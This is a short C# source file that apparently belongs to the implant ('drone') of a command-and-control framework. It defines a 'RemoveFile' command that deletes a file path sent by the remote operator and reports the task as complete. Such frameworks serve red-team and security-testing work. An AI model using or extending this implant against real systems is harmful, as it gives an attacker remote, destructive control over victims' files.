using System.IO;
using System.Threading;

namespace Drone.Commands;

public sealed class RemoveFile : DroneCommand
{
    public override byte Command => 0x17;
    public override bool Threaded => false;

    public override void Execute(DroneTask task, CancellationToken cancellationToken)
    {
        File.Delete(task.Arguments[0]);
        Drone.SendTaskComplete(task.Id);
    }
}